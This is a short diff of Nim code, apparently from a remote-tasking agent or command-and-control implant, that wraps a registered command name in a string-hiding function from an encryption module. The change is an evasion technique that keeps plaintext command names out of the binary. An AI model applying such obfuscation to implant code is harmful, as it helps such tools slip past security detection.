@@ -1,6 +1,7 @@
 import std/[json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc configExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
@@ -34,4 +35,4 @@ proc configExecute(taskId: string, params: JsonNode, state: AgentState,
                     status: "success", completed: true)
 
 proc initConfig*() =
-  register("config", configExecute)
+  register(hidstr("config"), configExecute)
